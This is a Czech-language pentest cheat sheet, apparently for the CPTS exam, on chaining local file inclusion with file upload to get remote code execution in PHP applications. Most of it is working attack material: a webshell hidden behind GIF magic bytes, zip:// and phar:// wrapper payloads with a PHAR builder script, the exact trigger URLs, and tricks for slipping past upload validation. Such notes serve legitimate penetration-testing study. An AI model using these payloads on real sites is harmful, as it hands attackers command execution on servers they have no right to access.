Kombinace LFI a libovolného uploadu souborů představuje spolehlivou cestu k Remote Code Execution (RCE). Pokud zranitelná LFI funkce kód spouští (`include`, `require`), nezáleží na příponě ani typu nahraného souboru – PHP kód se vykoná i z obrázku nebo zippovaného archivu.

**Přehled technik pro CPTS / Pentest**

|**Metoda**|**Prerekvizity**|**Příprava Payloadu**|**LFI URL / Wrapper Syntax**|
|---|---|---|---|
|**Obrázek (Magic Bytes)**|Běžný upload obrázků|`echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`|`?page=./uploads/shell.gif&cmd=id`|
|**ZIP Wrapper**|Nahraný ZIP (i přejmenovaný)|`zip shell.jpg shell.php`|`?page=zip://./uploads/shell.jpg%23shell.php&cmd=id`|
|**PHAR Wrapper**|Nahraný PHAR (i přejmenovaný)|Kompilace skriptem do `shell.jpg`|`?page=phar://./uploads/shell.jpg%2Fshell.txt&cmd=id`|

**1. Nahrání škodlivého obrázku (Nejspolehlivější metoda)**

Nejjednodušší a nejuniverzálnější metoda. Využívá toho, že validátor nahrávání sice ověří hlavičku obrázku, ale LFI funkce při načtení spustí obsažený PHP kód.

1. **Vytvoření payloadu s GIF Magic Bytes:**
    
    Bash
    
    ```
    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    ```
    
2. **Nahrání souboru:** Nahrajte `shell.gif` přes profilový obrázek nebo jakýkoliv jiný upload formulář.
    
3. **Zjištění cesty:** Vložte cestu k nahranému obrázku z HTML kódu (např. `/profile_images/shell.gif`).
    
4. **Spuštění RCE přes LFI:**
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=id
    ```
    

**2. ZIP Wrapper (`zip://`)**

Používá se jako alternativní metoda, pokud aplikace umožňuje nahrát zip archiv (nebo pokud nahraný zip s příponou `.jpg` projde kontrolou).

1. **Příprava webshellu a zabalení do ZIPu:**
    
    Bash
    
    ```
    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
    ```
    
2. **Nahrání:** Nahrajte soubor `shell.jpg` na server.
    
3. **Spuštění kódu z archivu:**
    
    _(Klíčové: Znak `#` v adresaci archivu je nutné URL zakódovat na `%23`)_
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
    ```
    

**3. PHAR Wrapper (`phar://`)**

Funguje obdobně jako ZIP wrapper, využívá však interní PHP archivní formát PHAR.

1. **Vytvoření kompilačního skriptu (`builder.php`):**
    
    PHP
    
    ```
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
    ```
    
2. **Kompilace a přejmenování:**
    
    Bash
    
    ```
    php --define phar.readonly=0 builder.php && mv shell.phar shell.jpg
    ```
    
3. **Nahrání a spuštění:**
    
    _(Klíčové: Lomítko u vnitřního souboru zakódujte jako `%2F`)_
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
    ```
    

**🔥 Klíčové triky pro CPTS zkoušku**

- **Obcházení validace obrázků:** Znaky `GIF8` na začátku souboru (ASCII magic bytes) oklamou kontrolu typu souboru u většiny jednoduchých upload formulářů.
    
- **URL Encoding je nutnost:**
    
    - U `zip://` **musí** být znak `#` zakódován jako `%23`, jinak jej prohlížeč vyhodnotí jako klientskou kotvu v URL.
        
    - U `phar://` zakódujte lomítko před vnitřním souborem jako `%2F`.
        
- **Návrat z podadresáře:** Pokud LFI kód automaticky vkládá složku (např. `include("languages/" . $_GET['page']);`), vyskočte z ní pomocí `../`:
    
    Fragment kódu
    
    ```
    ?language=../profile_images/shell.gif&cmd=id
    ```